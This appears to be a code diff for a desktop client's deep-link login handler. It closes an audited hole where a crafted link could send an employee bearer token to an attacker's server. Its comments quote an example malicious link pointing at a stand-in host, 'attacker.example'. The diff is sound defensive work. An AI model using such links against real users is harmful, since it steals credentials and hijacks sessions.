@@ -21,10 +21,13 @@ declare module '@deepseek-ai/cordis' {
  * server URL (https or loopback http), and store the session — the login
  * page's `/api/pico/auth/state` poll then flips to loggedIn and reloads.
  *
- * Security: a deep link is a local OS event, so it is treated like a login
- * form POST: the token is only accepted when the server URL is allowed and
- * the token verifies against that server (verified on next bootstrap fetch;
- * an attacker-crafted link just fails the fetch).
+ * Security (srvcore-1,审计 2026-09-13 P0):a deep link is a local OS event
+ * that **any** local process or web page can trigger, and the token inside it
+ * is a real employee bearer token (90 天)。因此 token 只允许发往两台服务端
+ * 之一:①当前活动会话的那台(刷新 token);②本机登录页正在等待的那台
+ *(见 `noteBrowserLoginStarted`)。判定全部发生在**任何网络请求之前** ——
+ * 旧实现先用 token 向链接里的 server 发 `/auth/me` 预验证、再判 F12,于是
+ * token 已经躺在攻击者日志里。
  */
 export function parseAuthDeepLink(
   url: string,
@@ -50,6 +53,97 @@ export function parseAuthDeepLink(
     username: parsed.searchParams.get('user') ?? '',
     token,
   }
+}
+
+/**
+ * 服务端身份串:scheme + host(去默认端口、host 小写;尾斜杠与子路径不参与)。
+ *
+ * 深链里的 `server` 与本地会话里存的 `serverURL` 可能只差书写形式
+ * (`https://A.example:443/` vs `https://a.example`),逐字符比较会把同一台
+ * 服务端判成"换端";反过来,攻击者也不能靠书写变体绕过比对。
+ * @param raw - 未规范化的服务端地址。
+ * @returns 身份串;无法解析时为 null(调用方按拒绝处理)。
+ */
+export function serverIdentity(raw: string): string | null {
+  let parsed: URL
+  try {
+    parsed = new URL(raw)
+  } catch {
+    return null
+  }
+  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
+  const defaultPort = (parsed.protocol === 'https:' && parsed.port === '443')
+    || (parsed.protocol === 'http:' && parsed.port === '80')
+  const port = defaultPort ? '' : parsed.port
+  return `${parsed.protocol}//${parsed.hostname.toLowerCase()}${port === '' ? '' : `:${port}`}`
+}
+
+/**
+ * 本机登录页正在等待的浏览器登录目标(身份串);null = 当前没有在等待。
+ * 与登录页同进程、同模块实例,故用模块级单例共享(见 `noteBrowserLoginStarted`)。
+ */
+let pendingBrowserLogin: string | null = null
+
+/**
+ * 本机登录页宿主是否已经"接线"(`noteLoginPageWired`,由 auth-gate 的 `apply()`
+ * 在**任何深链可能到达之前**同步调用)。
+ *
+ * 接线后进入严格模式:**未登录时只接受本机登录页正在等待的那台服务端**
+ * (`pendingBrowserLogin`),没有等待目标时一律拒绝。
+ *
+ * 没接线(本进程没有登录页的嵌入式装配)时保留旧行为:出货装配
+ * (`@picoaide/dsh-enterprise` 的 `cordis.patch.yml`)无条件挂载 auth-gate,并在
+ * `apply()` 的第一句调用 `noteLoginPageWired()`,所以真实产品构建恒为严格模式;
+ * 这扇门只向"根本没有登录页的嵌入式装配"敞开。
+ */
+let loginPageReportsPending = false
+
+/**
+ * 声明"本进程的登录页宿主已接线",从此未登录深链进入严格模式。
+ *
+ * R3-F3-N1a(P0,2026-09-13):严格模式此前**只**由 `noteBrowserLoginStarted()`
+ * 打开,而官方构建(`brands/official/brand.json`)的 `server_url` 是空串 ⇒
+ * 登录页下发时的武装被 `configuredServer === ''` 挡掉。于是官方/无预置地址的
+ * 构建里,只要员工没点过"使用浏览器登录",`loginPageReportsPending` 恒为 false,
+ * 未登录分支只剩 `assertServerURLAllowed`(https 一律放行):任意本机进程用
+ * `picoaide://auth?token=…&server=https://attacker.example` 就能把真实员工
+ * token 发给攻击者服务端、让攻击者服务端被采纳为会话,且零告警。
+ *
+ * 修法:「没有预置地址」不再是放行条件。auth-gate 的 `apply()` 无条件调用本函数
+ * (有预置地址时同时 `noteBrowserLoginStarted(configuredServer)`);没有预置地址
+ * 时 `pendingBrowserLogin` 保持 null ⇒ **未登录且未登记 = 一律拒绝深链**。
+ * 密码登录不经过深链,不受影响;OIDC 部署必然先经登录页的 `browserLogin()`
+ * 登记(`POST /api/pico/auth/browser-login`),所以也不会被锁死。
+ */
+export function noteLoginPageWired(): void {
+  loginPageReportsPending = true
+}
+
+/**
+ * 登记"本机登录页刚刚为哪台服务端发起了浏览器 SSO"(auth-gate 的
+ * `browserLogin()` 在 `window.open` 之前调用)。
+ *
+ * 这是 srvcore-1 客户端一半的关键:没有它,任意本机进程(或网页里的自定义
+ * scheme 跳转)都能构造 `picoaide://auth?token=…&server=https://attacker.example`,
+ * 让客户端把后续会话指向攻击者服务端。传空串 = 清除。
+ * @param serverURL - 登录页里用户填写并用于打开 login 地址的服务端。
+ */
+export function noteBrowserLoginStarted(serverURL: string): void {
+  pendingBrowserLogin = serverIdentity(serverURL)
+  loginPageReportsPending = true
+}
+
+/**
+ * 清除待登录目标(登录页复位:取消授权、轮询超时、返回上一步)。
+ * 清除后未登录状态下的深链一律拒绝 —— 迟到/伪造的回跳不再被接受。
+ */
+export function clearBrowserLoginPending(): void {
+  pendingBrowserLogin = null
+}
+
+/** 当前待登录目标(身份串);仅供诊断与测试。 */
+export function pendingBrowserLoginServer(): string | null {
+  return pendingBrowserLogin
 }
 
 /**
@@ -93,6 +187,30 @@ export function installDeepLinkListener(
       ctx.logger?.warn(`pico-deep-link: rejected unsafe server: ${error instanceof AuthError ? error.message : String(error)}`)
       return
     }
+    const identity = serverIdentity(session.serverURL)
+    if (identity === null) {
+      ctx.logger?.warn('pico-deep-link: ignored unparsable server')
+      return
+    }
+    // ---- 判定必须在任何网络请求之前(srvcore-1) ----
+    // F12(审计 2026-09-11):已登录时拒绝把活动会话静默切换到**另一台**
+    // 服务端 —— 任意本机进程都能触发该 scheme,配合攻击者服务器与自签 token
+    // 可完成会话劫持。同一台服务端(书写变体归一后相同)视作 token 刷新,放行。
+    const existing = getCurrent?.() ?? null
+    if (existing !== null) {
+      if (serverIdentity(existing.serverURL) !== identity) {
+        ctx.logger?.warn(`pico-deep-link: refused server switch while signed in; sign out first (${JSON.stringify(session.serverURL)})`)
+        return
+      }
+    } else if (loginPageReportsPending && pendingBrowserLogin !== identity) {
+      // srvcore-1 客户端一半:未登录时只接受本机登录页正在等待的服务端。
+      // 否则一个伪造的深链就能把用户后续的对话/技能全部指向攻击者服务端。
+      // 接线后 `pendingBrowserLogin === null`(官方构建没有预置地址、用户也
+      // 没点过浏览器登录)同样走这里 —— "没有等待目标"是拒绝理由,不是放行
+      // 理由(R3-N1a:官方构建上这条守卫曾经整体是死的)。
+      ctx.logger?.warn(`pico-deep-link: refused server no local login is waiting for (${JSON.stringify(session.serverURL)})`)
+      return
+    }
     // 安全:深链 token 先对目标网关预验证(/auth/me 带 token 探通),避免
     // 攻击者可控网关返回合法 bootstrap 把活动 session 劫持到任意 server——
     // 验证失败即拒绝,成功才 applySession(fire-and-forget,失败静默降级)。
@@ -103,15 +221,6 @@ export function installDeepLinkListener(
         // 日志消毒:serverURL/username 来自链接参数(攻击者可控),
         // JSON.stringify 剥离换行/控制符,防日志注入(2026-09-01 审计)。
         ctx.logger?.warn(`pico-deep-link: token rejected by ${JSON.stringify(session.serverURL)}: ${error instanceof Error ? error.message : String(error)}`)
-        return
-      }
-      // F12(审计 2026-09-11):已登录时拒绝把活动会话静默切换到**另一台
-      // 服务端** —— 任意本机进程都能触发该 scheme,配合攻击者服务器与
-      // 自签 token 可完成会话劫持(此前仅预验证目标可达,无法证明可信)。
-      // 单服务端产品语义下,切换服务器必须先显式登出。
-      const existing = getCurrent?.() ?? null
-      if (existing !== null && existing.serverURL !== session.serverURL) {
-        ctx.logger?.warn(`pico-deep-link: refused server switch while signed in; sign out first (${JSON.stringify(session.serverURL)})`)
         return
       }
       ctx.logger?.info(`pico-deep-link: logged in as ${JSON.stringify(session.username)}`)
